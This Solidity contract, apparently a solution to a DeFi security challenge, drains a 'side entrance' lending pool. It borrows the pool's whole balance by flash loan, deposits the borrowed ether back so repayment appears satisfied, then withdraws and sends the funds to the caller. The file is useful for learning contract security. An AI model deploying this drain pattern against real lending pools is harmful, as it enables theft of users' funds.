// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {IFlashLoanEtherReceiver, SideEntranceLenderPool} from "../side-entrance/SideEntranceLenderPool.sol";

contract HackSideEntrance is IFlashLoanEtherReceiver {
    SideEntranceLenderPool _pool;

    constructor(SideEntranceLenderPool pool_) {
        _pool = pool_;
    }

    function requestFlashLoan() external {
        _pool.flashLoan(address(_pool).balance);
        _pool.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    function execute() external payable {
        assert(address(_pool).balance == 0);
        _pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
